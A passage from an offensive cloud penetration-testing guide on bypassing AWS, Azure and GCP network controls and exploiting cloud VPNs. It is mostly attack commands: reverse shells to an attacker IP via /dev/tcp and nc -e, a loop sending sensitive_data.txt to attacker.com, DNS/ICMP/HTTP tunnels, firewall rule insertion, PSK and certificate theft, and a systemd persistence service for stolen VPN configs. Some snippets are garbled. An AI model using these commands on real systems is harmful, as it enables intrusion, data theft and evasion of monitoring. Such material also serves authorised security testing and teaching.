aws ec2 describe-network-acls --query 'NetworkAcls[*].[NetworkAclId,Associations[*].SubnetId]'
```

**Common Misconfigurations:**

1. **Ephemeral Port Range Not Allowed:** NACLs must allow ephemeral ports (typically 1024-65535) for return traffic. Missing this breaks outbound-initiated connections.

```bash
# Check for missing ephemeral port rules
aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
  --query 'NetworkAcls[*].Entries[?RuleNumber<32767 && Egress==false && PortRange.To<1024]'
```

2. **Rule Number Gaps:** Lower-numbered deny rules take precedence. [Inference] Inserting rules between existing rules can bypass restrictions.

```bash
# View rules with numbers to identify gaps
aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
  --query 'NetworkAcls[*].Entries[*].[RuleNumber,Protocol,RuleAction,CidrBlock,PortRange]' \
  --output table
```

3. **Default Allow-All NACLs:**

```bash
# Find subnets using default NACLs
aws ec2 describe-network-acls --filters "Name=default,Values=true" \
  --query 'NetworkAcls[*].[NetworkAclId,Associations[*].SubnetId]'
```

**Bypass Techniques:**

**1. Exploiting Stateless Nature:** Unlike security groups, NACLs don't track connection state. [Inference] If outbound rules are permissive, you can establish reverse connections even if inbound is restricted.

```bash
# From compromised instance in restricted subnet:
# If egress allows TCP to your IP, establish reverse shell
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'

# Or use HTTP/DNS tunneling if those protocols are allowed outbound
# DNS tunneling via iodine
iodine -f <attacker_domain>

# HTTP tunneling via reverse proxy
ssh -R 8080:localhost:8080 <attacker_ip>
```

**2. Protocol Confusion:** [Inference] NACLs specify protocol by number. Misconfigured rules might allow unexpected protocols.

```bash
# Check for rules allowing all protocols (-1)
aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
  --query 'NetworkAcls[*].Entries[?Protocol==`-1`]'

# Common protocols:
# 6 = TCP
# 17 = UDP  
# 1 = ICMP
# -1 = ALL

# Test ICMP tunneling if ICMP allowed but TCP/UDP blocked
# Using ptunnel
ptunnel -p <pivot_host> -lp 8000 -da <target_ip> -dp 22
```

**3. Source Port Exploitation:** [Inference] Some NACL rules only filter destination ports, forgetting source port filtering on response traffic.

```bash
# If NACL blocks port 443 inbound but allows port 443 outbound:
# Use source port 443 for your attack traffic
nmap --source-port 443 <target_ip>

# Bind reverse shell to use source port 443
nc -lvnp 443 # on attacker
nc <attacker_ip> 443 -p 443 -e /bin/bash # from target
```

**4. NACL Rule Insertion:** [Inference] If you have `ec2:CreateNetworkAclEntry` permissions:

```bash
# Insert allow rule with lower rule number than deny rule
aws ec2 create-network-acl-entry \
  --network-acl-id acl-xxxxx \
  --rule-number 50 \
  --protocol tcp \
  --port-range From=22,To=22 \
  --cidr-block <your_ip>/32 \
  --rule-action allow \
  --ingress

# Delete restrictive rule
aws ec2 delete-network-acl-entry \
  --network-acl-id acl-xxxxx \
  --rule-number 100 \
  --ingress
```

**5. Subnet Hopping:** [Inference] NACLs are subnet-specific. If you compromise an instance in a less-restricted subnet, pivot from there.

```bash
# From compromised instance in permissive subnet:
# Scan internal resources in restricted subnets
nmap -sT <target_subnet_range>

# Use as SOCKS proxy
ssh -D 8080 <compromised_instance>
# Then route traffic through proxy

# Port forwarding to reach restricted resources
ssh -L 3389:<restricted_ip>:3389 <compromised_instance>
```

### Azure NSG Subnet-Level Rules

Azure NSGs at subnet level function similarly to AWS NACLs but are stateful. Key differences:

**Enumeration:**

```bash
# Find subnet-level NSG assignments
az network vnet subnet list --resource-group <rg_name> --vnet-name <vnet_name> \
  --query "[].{Name:name, NSG:networkSecurityGroup.id}"

# View effective security rules (combines NIC and subnet NSGs)
az network nic list-effective-nsg --resource-group <rg_name> --name <nic_name>
```

**Bypass Considerations:**

**1. NIC-Level Override:** [Inference] If subnet NSG is restrictive but NIC-level NSG is permissive, NIC rules are evaluated first for inbound traffic.

```bash
# Check rule evaluation order
az network nic list-effective-nsg --resource-group <rg_name> --name <nic_name> \
  --query "effectiveSecurityRules[].{Name:name, Source:source, Priority:priority}" \
  --output table

# Look for "DefaultSecurityRules" vs "SecurityRule" (custom)
# User-defined rules (100-4096) processed before defaults (65000+)
```

**2. Service Endpoints Bypass:** [Inference] Service endpoints allow direct access to Azure services bypassing NSG rules for that traffic.

```bash
# Check service endpoints on subnet
az network vnet subnet show --resource-group <rg_name> \
  --vnet-name <vnet_name> --name <subnet_name> \
  --query serviceEndpoints

# Common service endpoints:
# - Microsoft.Storage (Blob, File, Queue, Table)
# - Microsoft.Sql
# - Microsoft.KeyVault
```

**3. Private Endpoints:** [Inference] Private endpoints create ENI in your VNet for PaaS services, bypassing subnet NSGs intended to restrict service access.

```bash
# List private endpoints
az network private-endpoint list --output table

# Check private endpoint connections
az network private-endpoint-connection list --name <service_name> --resource-group <rg_name> --type <service_type>
```

### GCP VPC Firewall Hierarchies

GCP has multiple firewall layers that can be exploited or bypassed:

**1. VPC Firewall Rules (VPC-level)** **2. Hierarchical Firewall Policies (Org/Folder-level)** **3. Implied Rules (default-allow-internal, etc.)**

**Enumeration:**

```bash
# List VPC firewall rules by priority
gcloud compute firewall-rules list --sort-by priority

# Check hierarchical policies (requires appropriate IAM)
gcloud compute firewall-policies list --organization <org_id>

# Get effective firewalls for an instance
gcloud compute instances get-effective-firewalls <instance_name> --zone <zone>
```

**Bypass Techniques:**

**1. Implied Rules Exploitation:** GCP has implicit allow rules for internal VPC traffic that can't be deleted:

```bash
# default-allow-internal: Allows all protocols from 10.0.0.0/8 (internal VPC range)
# If you compromise any instance in the VPC:
# Scan entire internal network freely

nmap -sT 10.0.0.0/8 -p 22,80,443,3389,5432,3306

# Establish lateral movement paths

# Internal traffic typically less monitored than external
````

**2. Priority Manipulation:**
[Inference] VPC firewall rules override hierarchical policies if priorities conflict. Create low-priority VPC rules to bypass org-level restrictions.

```bash
# If you have compute.firewalls.create at project level:
# Create priority 0 rule (highest priority)
gcloud compute firewall-rules create bypass-org-policy \
  --network <vpc_name> \
  --priority 0 \
  --direction INGRESS \
  --action ALLOW \
  --rules all \
  --source-ranges <your_ip>/32 \
  --target-tags compromised-instance

# Add tag to your instance
gcloud compute instances add-tags <instance_name> \
  --tags compromised-instance \
  --zone <zone>
````

**3. VPC Peering Firewall Bypass:** [Inference] Firewall rules in peered VPCs are not automatically shared. Traffic between peered VPCs only evaluated by local VPC rules.

```bash
# List VPC peerings
gcloud compute networks peerings list --network <vpc_name>

# Check peering configuration
gcloud compute networks peerings describe <peering_name> --network <vpc_name>

# If you compromise instance in peered VPC with more permissive rules:
# Use as pivot to access restricted resources in original VPC
```

**4. Shared VPC Exploitation:** [Inference] In Shared VPC setup, service projects inherit host project firewall rules but can add their own. Conflicting rules create bypass opportunities.

```bash
# Check if VPC is shared
gcloud compute shared-vpc get-host-project <project_id>

# List associated service projects
gcloud compute shared-vpc list-associated-resources <host_project_id>

# If you're in service project, create project-specific rules
gcloud compute firewall-rules create service-project-bypass \
  --network <shared_vpc_name> \
  --priority 50 \
  --direction INGRESS \
  --action ALLOW \
  --rules tcp:22 \
  --source-ranges <your_ip>/32 \
  --project <service_project_id>
```

### Advanced NACL/Firewall Bypass Techniques

**1. Fragmentation Attacks:** [Inference] Some network ACLs/firewalls don't properly reassemble fragmented packets, allowing bypass of port-based rules.

```bash
# Use nmap with fragmentation
nmap -f <target_ip> -p <blocked_port>

# More aggressive fragmentation
nmap -ff <target_ip> -p <blocked_port>

# Custom fragment size with scapy
from scapy.all import *
packet = IP(dst="<target_ip>", flags="MF")/TCP(dport=<blocked_port>)
send(fragment(packet, fragsize=8))
```

**2. IP Protocol Tunneling:** [Inference] If NACL/firewall blocks TCP/UDP but allows other IP protocols:

```bash
# Check allowed protocols
# AWS NACL
aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
  --query 'NetworkAcls[*].Entries[?RuleAction==`allow`].Protocol'

# Common protocol numbers:
# 4 = IP-in-IP
# 41 = IPv6 encapsulation
# 47 = GRE
# 50 = ESP (IPsec)
# 51 = AH (IPsec)

# If GRE (47) allowed, use GRE tunnel
# On attacker server:
ip tunnel add gre1 mode gre remote <target_ip> local <attacker_ip>
ip addr add 192.168.100.1/30 dev gre1
ip link set gre1 up

# On compromised target:
ip tunnel add gre1 mode gre remote <attacker_ip> local <target_ip>
ip addr add 192.168.100.2/30 dev gre1
ip link set gre1 up

# Now SSH through GRE tunnel
ssh user@192.168.100.2
```

**3. ICMP Tunneling:** ICMP often allowed for diagnostics but can carry data:

```bash
# Using icmptunnel
# On attacker (requires root):
./icmptunnel -s

# On target:
./icmptunnel <attacker_ip>

# Or use Hans (ICMP tunnel)
# Server side:
hans -s 10.1.2.0 -p <password>

# Client side:
hans -c <attacker_ip> -p <password>

# Or ping tunnel
# Server:
ptunnel -x <password>

# Client:
ptunnel -p <attacker_ip> -lp 8000 -da <internal_target> -dp 22 -x <password>
```

**4. DNS Tunneling:** DNS typically allowed outbound and rarely blocked:

```bash
# Using iodine
# Server setup (you need a domain):
iodined -f 10.0.0.1 -P <password> tunnel.yourdomain.com

# Client (from compromised instance):
iodine -f -P <password> tunnel.yourdomain.com

# Test tunnel:
ssh user@10.0.0.1

# Using dnscat2 (more feature-rich)
# Server:
ruby dnscat2.rb tunnel.yourdomain.com

# Client:
./dnscat tunnel.yourdomain.com
```

**5. HTTP/HTTPS Tunneling:** If web traffic allowed but direct connections blocked:

```bash
# Using Chisel (HTTP tunnel)
# Server (attacker):
chisel server -p 8080 --reverse

# Client (target):
chisel client <attacker_ip>:8080 R:3389:127.0.0.1:3389

# Using reGeorg web shell tunnel
# Upload reGeorg webshell to accessible web server
# Then create SOCKS proxy:
python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.php

# Configure proxychains to use localhost:8080
proxychains nmap <internal_target>

# SSH over HTTP using corkscrew
# Install corkscrew, configure in ~/.ssh/config:
Host internal-server
    ProxyCommand corkscrew <proxy_ip> 8080 %h %p
```

**6. Port Knocking:** [Inference] If NACL/firewall rules change based on specific packet sequences:

```bash
# Using knock
knock <target_ip> 1000 2000 3000

# Then attempt connection
ssh user@<target_ip>

# Using nmap for custom knock sequence
nmap -Pn --max-retries 0 -p 1000 <target_ip>
nmap -Pn --max-retries 0 -p 2000 <target_ip>
nmap -Pn --max-retries 0 -p 3000 <target_ip>

# Using hping3 with TCP flags
hping3 -S -p 1000 -c 1 <target_ip>
hping3 -S -p 2000 -c 1 <target_ip>
hping3 -S -p 3000 -c 1 <target_ip>
```

### Traffic Analysis and Evasion

**Packet Capture in Cloud Environments:**

**AWS VPC Flow Logs Analysis:**

```bash
# Enable flow logs (if you have permissions)
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids vpc-xxxxx \
  --traffic-type ALL \
  --log-destination-type s3 \
  --log-destination arn:aws:s3:::my-flow-logs/

# Query flow logs (if stored in CloudWatch)
aws logs filter-log-events \
  --log-group-name /aws/vpc/flowlogs \
  --filter-pattern "[version, account, eni, source, destination, srcport, destport=22, protocol=6, packets, bytes, start, end, action=REJECT, status]"

# Download and analyze S3-stored flow logs
aws s3 sync s3://flow-log-bucket/AWSLogs/ ./flow-logs/
```

**Azure NSG Flow Logs:**

```bash
# Check flow log status
az network watcher flow-log list --resource-group <rg_name>

# Configure flow logs
az network watcher flow-log create \
  --resource-group <rg_name> \
  --nsg <nsg_name> \
  --storage-account <storage_account> \
  --location <region> \
  --name <flow_log_name>

# Query with PowerShell
Get-AzNetworkWatcherFlowLog -ResourceGroupName <rg_name> -Name <flow_log_name>
```

**GCP VPC Flow Logs:**

```bash
# Enable flow logs on subnet
gcloud compute networks subnets update <subnet_name> \
  --region <region> \
  --enable-flow-logs \
  --logging-aggregation-interval=interval-5-sec \
  --logging-flow-sampling=1.0

# Query flow logs in Cloud Logging
gcloud logging read "resource.type=gce_subnetwork AND logName=projects/<project_id>/logs/compute.googleapis.com%2Fvpc_flows" \
  --limit 50 \
  --format json

# Using log filters for denied traffic
gcloud logging read "resource.type=gce_subnetwork AND jsonPayload.reporter=DEST AND jsonPayload.disposition=DENIED" \
  --limit 50
```

**Evasion Techniques:**

**1. Timing-Based Evasion:** [Inference] Flow logs may aggregate data over time intervals. Slow, sporadic traffic may avoid detection.

```bash
# Slow scan with nmap
nmap -T0 <target_ip> # Paranoid timing (wait 5 min between probes)
nmap -T1 <target_ip> # Sneaky timing

# Rate-limited data exfiltration
for chunk in $(split -b 1K sensitive_data.txt); do
  curl -X POST -d @$chunk http://attacker.com/collect
  sleep 300 # 5 minute delay
done
```

**2. Protocol Mimicry:** [Inference] Make malicious traffic look like legitimate protocols:

```bash
# HTTP traffic masquerading
# Instead of raw TCP connection, wrap in HTTP
curl -X POST http://<target_ip>:<port>/path -H "Content-Type: application/x-www-form-urlencoded" -d "cmd=whoami"

# DNS tunneling (looks like legitimate DNS queries)
# Already covered above with iodine/dnscat2

# HTTPS tunneling (encrypted, harder to inspect)
# Use TLS wrapping for any protocol
stunnel configuration or similar
```

**3. Decoy Traffic:** [Inference] Generate legitimate-looking traffic to hide malicious activity:

```bash
# Nmap decoy scanning
nmap -D RND:10 <target_ip> # Use 10 random decoys
nmap -D <decoy1>,<decoy2>,ME,<decoy3> <target_ip> # Specify decoys

# Mix malicious requests with normal ones
while true; do
  curl http://target.com/normal_page # Legitimate
  sleep $((RANDOM % 10))
  curl http://target.com/admin_panel # Malicious
  sleep $((RANDOM % 30))
done
```

---

## VPN Exploitation

### Cloud VPN Architecture

**AWS VPN Types:**

1. **Site-to-Site VPN** - Connects on-premises networks to AWS VPC
2. **Client VPN** - Remote access VPN for individual users
3. **VPN CloudHub** - Multiple sites connected via VPN

**Azure VPN Types:**

1. **Site-to-Site (S2S)** - IPsec/IKE VPN tunnel
2. **Point-to-Site (P2S)** - Client VPN using SSTP, OpenVPN, or IKEv2
3. **VNet-to-VNet** - Connects Azure VNets

**GCP VPN Types:**

1. **Classic VPN** - IKEv1/IKEv2 VPN tunnels
2. **HA VPN** - High availability VPN with 99.99% SLA
3. **Cloud VPN with Cloud Router** - Dynamic routing with BGP

### AWS VPN Enumeration and Exploitation

**Enumeration Commands:**

```bash
# List VPN connections
aws ec2 describe-vpn-connections

# Get VPN connection details
aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx

# List customer gateways (on-premises side)
aws ec2 describe-customer-gateways

# List VPN gateways (AWS side)
aws ec2 describe-vpn-gateways

# Check VPN connection routes
aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
  --query 'VpnConnections[*].Routes'

# List Client VPN endpoints
aws ec2 describe-client-vpn-endpoints

# Get Client VPN endpoint details
aws ec2 describe-client-vpn-endpoints --client-vpn-endpoint-ids cvpn-endpoint-xxxxx

# List Client VPN authorization rules
aws ec2 describe-client-vpn-authorization-rules --client-vpn-endpoint-id cvpn-endpoint-xxxxx

# Get VPN connection configuration
aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
  --query 'VpnConnections[*].CustomerGatewayConfiguration' --output text
```

**Site-to-Site VPN Exploitation:**

**1. Configuration Extraction:** [Inference] VPN configuration files contain pre-shared keys (PSKs) and tunnel parameters:

```bash
# Download VPN configuration
aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
  --query 'VpnConnections[*].CustomerGatewayConfiguration' --output text > vpn-config.xml

# Parse PSK from configuration (XML format varies by vendor)
grep -i "pre-shared-key" vpn-config.xml
grep -i "psk" vpn-config.xml

# Common fields in config:
# - Pre-shared keys
# - Tunnel IP addresses (AWS side and customer side)
# - IKE/IPsec parameters
# - BGP ASN numbers
```

**2. VPN Tunnel Attacks:**

**IKE Aggressive Mode Exploitation:** [Inference] If VPN uses IKE Aggressive Mode (IKEv1), PSK can be captured and cracked offline:

```bash
# Use ike-scan to probe VPN gateway
ike-scan -M -A <vpn_gateway_ip>

# If aggressive mode enabled, capture response with PSK hash
ike-scan -M -A <vpn_gateway_ip> --id=vpnuser -P vpn-capture.txt

# Convert to hashcat format
python psk-crack.py -r vpn-capture.txt

# Crack PSK with hashcat
hashcat -m 5300 psk-hash.txt /usr/share/wordlists/rockyou.txt

# Or use ikecrack (part of ike-scan)
ikecrack -f vpn-capture.txt -d wordlist.txt
```

**IKEv2 Exploitation:** [Inference] IKEv2 more secure but misconfigurations exist:

```bash
# Enumerate IKEv2 proposals
ike-scan -2 <vpn_gateway_ip>

# Test for weak ciphers
ike-scan -2 <vpn_gateway_ip> --trans=5,2,1,2 # Weak DH group 2
ike-scan -2 <vpn_gateway_ip> --trans=5,1,1,2 # 3DES encryption

# Attempt NULL authentication
ike-scan -2 <vpn_gateway_ip> --auth=0
```

**3. BGP Hijacking (if BGP enabled):** [Inference] AWS VPN can use BGP for dynamic routing. Misconfigured BGP can be exploited:

```bash
# Check if BGP is used
aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
  --query 'VpnConnections[*].Options.EnableAcceleration'

# BGP ASN information
aws ec2 describe-vpn-connections --vpn-connection-ids vpn-xxxxx \
  --query 'VpnConnections[*].[CustomerGatewayConfiguration]'

# If you compromise customer gateway or have BGP access:
# Announce more specific routes to hijack traffic
# Example with Quagga/FRRouting (requires BGP access):
vtysh
configure terminal
router bgp <your_asn>
network 10.0.0.0/24 # More specific than VPN's 10.0.0.0/16
```

**Client VPN Exploitation:**

**1. Authorization Rule Bypass:**

```bash
# Check authorization rules
aws ec2 describe-client-vpn-authorization-rules \
  --client-vpn-endpoint-id cvpn-endpoint-xxxxx

# Look for overly permissive rules:
# - Access to 0.0.0.0/0
# - Authorization to all users (allow-all)
# - Missing MFA requirements

# If you have permissions, add authorization rule
aws ec2 authorize-client-vpn-ingress \
  --client-vpn-endpoint-id cvpn-endpoint-xxxxx \
  --target-network-cidr 0.0.0.0/0 \
  --authorize-all-groups
```

**2. Certificate-Based Authentication Exploitation:**

```bash
# If using mutual TLS authentication, certificates may be stored insecurely

# Check ACM certificates
aws acm list-certificates

# Export certificate (requires permissions)
aws acm get-certificate --certificate-arn arn:aws:acm:region:account:certificate/xxxxx

# If client certificates found on compromised systems:
find / -name "*.ovpn" 2>/dev/null
find / -name "*.p12" 2>/dev/null
find / -name "client.crt" 2>/dev/null
find / -name "client.key" 2>/dev/null

# Use found certificates to connect
openvpn --config client.ovpn
```

**3. Split Tunnel Exploitation:** [Inference] If split tunneling enabled, traffic to non-VPC destinations goes direct:

```bash
# Check split tunnel configuration
aws ec2 describe-client-vpn-endpoints --client-vpn-endpoint-ids cvpn-endpoint-xxxxx \
  --query 'ClientVpnEndpoints[*].SplitTunnel'

# If split tunnel enabled, route only VPC traffic through VPN
# Attacker can intercept/monitor non-VPN traffic
# From compromised client, check routing:
ip route show
# Or on Windows:
route print

# Traffic not destined for VPC CIDR goes direct - vulnerable to MitM
```

### Azure VPN Exploitation

**Enumeration Commands:**

```bash
# List VPN gateways
az network vnet-gateway list --output table

# Get VPN gateway details
az network vnet-gateway show --resource-group <rg_name> --name <gateway_name>

# List VPN connections
az network vpn-connection list --resource-group <rg_name> --output table

# Get connection details (includes shared key)
az network vpn-connection show --resource-group <rg_name> --name <connection_name>

# Retrieve shared key (requires permissions)
az network vpn-connection shared-key show \
  --resource-group <rg_name> \
  --connection-name <connection_name>

# List P2S VPN configurations
az network vnet-gateway show --resource-group <rg_name> --name <gateway_name> \
  --query vpnClientConfiguration

# List local network gateways (on-premises side)
az network local-gateway list --output table
```

**PowerShell Enumeration:**

```powershell
# Get VPN gateways
Get-AzVirtualNetworkGateway

# Get VPN gateway details
$gw = Get-AzVirtualNetworkGateway -ResourceGroupName <rg_name> -Name <gateway_name>
$gw | Select-Object *

# Get VPN connections
Get-AzVirtualNetworkGatewayConnection -ResourceGroupName <rg_name>

# Retrieve shared key
Get-AzVirtualNetworkGatewayConnectionSharedKey -ResourceGroupName <rg_name> -Name <connection_name>

# Get P2S client configuration
Get-AzVpnClientConfiguration -ResourceGroupName <rg_name> -VirtualNetworkGatewayName <gateway_name>
```

**Site-to-Site VPN Exploitation:**

**1. Shared Key Extraction:** [Inference] Azure stores VPN shared keys in plaintext (encrypted at rest but retrievable with permissions):

```bash
# If you have Microsoft.Network/connections/sharedkey/action permission:
az network vpn-connection shared-key show \
  --resource-group <rg_name> \
  --connection-name <connection_name> \
  --query value -o tsv

# Test VPN connection with extracted key
# Using strongSwan on Kali:
cat >> /etc/ipsec.conf <<EOF
conn azure-vpn
    authby=secret
    type=tunnel
    left=%defaultroute
    leftsubnet=<local_subnet>
    right=<azure_gateway_public_ip>
    rightsubnet=<azure_vnet_cidr>
    ike=aes256-sha2_256-modp1024!
    esp=aes256-sha2_256!
    keyexchange=ikev2
    auto=start
EOF

echo "<azure_gateway_public_ip> : PSK \"<extracted_shared_key>\"" >> /etc/ipsec.secrets

ipsec start
ipsec up azure-vpn
```

**2. Point-to-Site VPN Exploitation:**

**Certificate Theft:**

```bash
# P2S VPN uses certificates for authentication
# If you compromise a system with VPN access:

# Windows certificate stores:
certutil -store -user My
certutil -exportPFX -user My <cert_serial> <output.pfx>

# Linux certificate locations:
find /home -name "*.pfx" -o -name "*.p12" 2>/dev/null
find /home -name "*vpn*" -type f 2>/dev/null

# Extract certificate and key from PFX
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in cert.pfx -nokeys -out cert.pem
```

**Azure AD Authentication Bypass:** [Inference] P2S VPN can use Azure AD authentication. If you compromise Azure AD credentials:

```bash
# Generate VPN client configuration
az network vnet-gateway vpn-client generate \
  --resource-group <rg_name> \
  --name <gateway_name> \
  --processor-architecture Amd64

# Download returns URL to configuration ZIP
wget "<config_url>"

# Extract and configure OpenVPN with Azure AD auth
unzip vpnclient.zip
cd OpenVPN
sudo openvpn --config vpnconfig.ovpn
# Prompts for Azure AD authentication
```

**3. VPN Gateway Reset Attack:** [Inference] If you have `Microsoft.Network/virtualNetworkGateways/reset/action` permission:

```bash
# Reset VPN gateway (causes service disruption)
az network vnet-gateway reset \
  --resource-group <rg_name> \
  --name <gateway_name>

# During reset window, possible to:
# - Interrupt active VPN sessions
# - Force renegotiation with captured credentials
# - Exploit race conditions in connection reestablishment
```

### GCP VPN Exploitation

**Enumeration Commands:**

```bash
# List VPN gateways
gcloud compute vpn-gateways list

# Get VPN gateway details
gcloud compute vpn-gateways describe <gateway_name> --region <region>

# List VPN tunnels
gcloud compute vpn-tunnels list

# Get tunnel details (includes shared secret reference)
gcloud compute vpn-tunnels describe <tunnel_name> --region <region>

# List target VPN gateways (Classic VPN)
gcloud compute target-vpn-gateways list

# Check Cloud Router configuration (for dynamic routing)
gcloud compute routers list

# Get router details including BGP peers
gcloud compute routers describe <router_name> --region <region>

# List VPN tunnel routes
gcloud compute routes list --filter="nextHopVpnTunnel:<tunnel_name>"
```

**Classic VPN Exploitation:**

**1. Shared Secret Extraction:** [Inference] GCP stores shared secrets in metadata, not directly retrievable via gcloud but visible during creation:

```bash
# Shared secrets set during tunnel creation
# If you have compute.vpnTunnels.create permission, create tunnel to see format:
gcloud compute vpn-tunnels create test-tunnel \
  --peer-address <peer_ip> \
  --shared-secret <secret> \
  --target-vpn-gateway <gateway> \
  --region <region>

# Shared secrets also in:
# - Deployment scripts
# - Terraform/configuration files
# - Service account metadata

# Search for secrets in project metadata
gcloud compute project-info describe --format="value(commonInstanceMetadata)"

# Check instance metadata (if VPN gateway is compute instance)
gcloud compute instances describe <instance_name> --zone <zone> \
  --format="value(metadata)"
```

**2. Cloud Router/BGP Exploitation:** [Inference] HA VPN uses Cloud Router with BGP. BGP misconfigurations allow route manipulation:

```bash
# Get BGP configuration
gcloud compute routers describe <router_name> --region <region> \
  --format="value(bgpPeers)"

# Check BGP peer ASNs
gcloud compute routers describe <router_name> --region <region> \
  --format="value(bgp.asn, bgpPeers[].peerAsn)"

# If you compromise on-premises BGP peer:
# Announce routes to hijack traffic

# Example BGP configuration on compromised peer (using FRRouting):
router bgp <peer_asn>
 neighbor <cloud_router_ip> remote-as <cloud_router_asn>
 network 10.128.0.0/20  # More specific than GCP subnet
 exit
```

**3. VPN Tunnel Traffic Interception:** [Inference] If you control network between on-premises and GCP:

```bash
# Capture IKE negotiation
tcpdump -i <interface> -w vpn-capture.pcap 'udp port 500 or udp port 4500'

# Analyze with Wireshark or ike-scan
wireshark vpn-capture.pcap

# Attempt to crack PSK from captured IKE exchange
ike-scan -M -A --aggressive <gcp_vpn_gateway_ip>

# If successful, establish rogue tunnel to intercept traffic
```

**HA VPN Specific Issues:**

```bash
# HA VPN uses two tunnel interfaces for redundancy
# List both interfaces
gcloud compute vpn-gateways describe <ha_gateway_name> --region <region> \
  --format="value(vpnInterfaces)"

# If only one tunnel active, traffic flows through single path
# Check tunnel status
gcloud compute vpn-tunnels describe <tunnel_name> --region <region> \
  --format="value(status, detailedStatus)"

# Exploit single point of failure if both tunnels not properly configured
```

### Cross-Platform VPN Pivoting

Once VPN access established, pivot into cloud networks:

**1. Network Reconnaissance:**

```bash
# Discover internal network ranges
ip route show # On Linux VPN client
route print # On Windows VPN client

# Scan VPC/VNet from VPN connection
nmap -sn <vpc_cidr> # Host discovery
nmap -sT -p 22,80,443,3389,5432,3306 <vpc_cidr> # Service discovery

# Enumerate cloud metadata services (if routed)
curl http://169.254.169.254/latest/meta-data/ # AWS
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" # Azure
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" # GCP
```

**2. Lateral Movement:**

```bash
# Use VPN as SOCKS proxy for internal access
ssh -D 9050 -N <user>@<vpn_connected_host>

# Configure proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf

# Access internal resources through proxy
proxychains nmap -sT <internal_target>
proxychains curl http://<internal_web_app>

# Port forwarding for specific services
ssh -L 3389:<internal_rdp_host>:3389 <user>@<vpn_connected_host>
rdesktop 127.0.0.1
```

**3. Credential Harvesting:** [Inference] Internal cloud resources often have relaxed authentication when accessed via VPN:

```bash
# Check for internal credential stores
proxychains curl http://<internal_jenkins>/credentials
proxychains curl http://<internal_vault>:8200/v1/sys/health

# Access internal databases without IP restrictions
proxychains psql -h <internal_db> -U admin -d production

# Enumerate internal file shares
proxychains smbclient -L //<internal_file_server> -U <user>
```

**4. VPN as Persistence Mechanism:** [Inference] Maintaining VPN access provides persistent entry point:

```bash
# Automate VPN reconnection
# For OpenVPN:
while true; do
  openvpn --config stolen-config.ovpn
  sleep 60
done

# Or with systemd service (Linux):
cat > /etc/systemd/system/persistence-vpn.service <<EOF
[Unit]
Description=Persistence VPN Connection
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/openvpn --config /root/.vpn/stolen-config.ovpn
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable persistence-vpn
systemctl start persistence-vpn
```

### VPN Security Analysis Tools

**Comprehensive VPN Assessment:**

```bash
# IKE/IPsec scanning suite
ike-scan -M <vpn_gateway>  # Main mode
ike-scan -M -A <vpn_gateway>  # Aggressive mode
ike-scan -2 <vpn_gateway>  # IKEv2

# Test all DH groups
for group in 1 2 5 14 15 16 17 18; do
  echo "Testing DH group $group"
  ike-scan -M --trans=5,2,1,$group <vpn_gateway>
done

# Test weak encryption algorithms
ike-scan -M --trans=1,1,1,2 <vpn_gateway>  # DES
ike-scan -M --trans=5,1,1,2 <vpn_gateway>  # 3DES

# Fiked - Fake IKE daemon for testing
python fiked.py -i <interface> -g <gateway_ip>
```

**OpenVPN Security Testing:**

```bash
# If OpenVPN used, test for misconfigurations
# Connect with various cipher options
openvpn --config client.ovpn --cipher DES-CBC  # Weak cipher
openvpn --config client.ovpn --auth none  # No authentication

# Check for compression (VORACLE vulnerability - CVE-2019-14899)
grep "comp-lzo" client.ovpn

# Test for credential reuse
# Try same certificate on multiple endpoints
```

### Defense Evasion in VPN Context

**1. Blending with Legitimate Traffic:**

```bash
# Match legitimate VPN traffic patterns
# Analyze normal traffic timing
tcpdump -i vpn0 -c 100 -w normal-traffic.pcap

# Replay timing patterns with your malicious traffic

tcpreplay --topspeed --intf1 = < interface > normal-traffic.pcap

# Or implement adaptive timing in scripts

last_packet_time = $(date +%s) while read command ; do current_time = $(date +%s) time_diff = $((current_time - last_packet_time))

# Mimic normal inter-packet delay (adjust based on analysis)

if [ $time_diff -lt 5 ] ; then sleep $((5 - time_diff)) fi

execute_command "$command" last_packet_time = $(date +%s) done < commands.txt
````

**2. Traffic Obfuscation:**
```bash
# Wrap VPN traffic in additional encryption layer
# Using stunnel to wrap OpenVPN in TLS
# stunnel.conf:
cat > stunnel.conf <<EOF
[openvpn]
client = yes
accept = 127.0.0.1:1194
connect = <vpn_gateway>:443
EOF

stunnel stunnel.conf

# Connect OpenVPN to local stunnel port
openvpn --remote 127.0.0.1 1194 --config client.ovpn

# Or use obfsproxy (Tor obfuscation)
obfsproxy obfs3 --dest=<vpn_gateway>:1194 client 127.0.0.1:1194
openvpn --remote 127.0.0.1 1194 --config client.ovpn
````

**3. Split Personality VPN Client:** [Inference] Simultaneously maintain legitimate and malicious VPN sessions:

```bash
# Create separate routing tables
ip rule add from <your_ip> table 100
ip route add default via <vpn_gateway1> table 100

ip rule add from <your_ip> table 200  
ip route add default via <vpn_gateway2> table 200

# Route legitimate traffic through one VPN, malicious through another
# Using iptables marks
iptables -t mangle -A OUTPUT -p tcp --dport 80 -j MARK --set-mark 1
iptables -t mangle -A OUTPUT -p tcp --dport 443 -j MARK --set-mark 1
ip rule add fwmark 1 table 100  # Legitimate traffic

iptables -t mangle -A OUTPUT -p tcp --dport 4444 -j MARK --set-mark 2
ip rule add fwmark 2 table 200  # Malicious traffic
```

**4. VPN Covert Channels:** [Inference] Hide data in VPN protocol fields:

```bash
# ICMP covert channel over VPN
# Encode data in ICMP payload
